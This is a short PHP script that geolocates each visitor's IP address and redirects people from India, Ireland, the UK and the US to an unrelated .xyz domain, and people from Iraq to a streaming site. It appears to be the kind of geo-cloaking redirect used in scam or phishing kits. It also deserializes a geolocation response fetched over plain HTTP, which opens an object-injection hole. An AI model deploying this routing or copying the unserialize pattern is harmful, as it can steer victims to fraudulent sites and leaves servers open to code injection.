<?php
$zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
$country = $addrDetailsArr['geoplugin_countryName'];
if (!$country)
{
    $country='Not found!';
}
if (strcmp($country, 'India')==0)
{
      header("location: http://ikosaudi.xyz ");
     exit();
} 
//______________//


else if (strcmp($country, 'Ireland')==0)
{
      header("location: http://ikosaudi.xyz ");
     exit();
} 
//______________//

else if (strcmp($country, 'United Kingdom')==0)
{
      header("location: http://ikosaudi.xyz ");
     exit();
} 
//______________//
else if (strcmp($country, 'United States')==0)
{
      header("location: http://ikosaudi.xyz ");
     exit();
}
//______________//
else if (strcmp($country, 'Iraq')==0)
{
      header("location: https://shahid.mbc.net/ar/ ");
     exit();
}

?>
fff
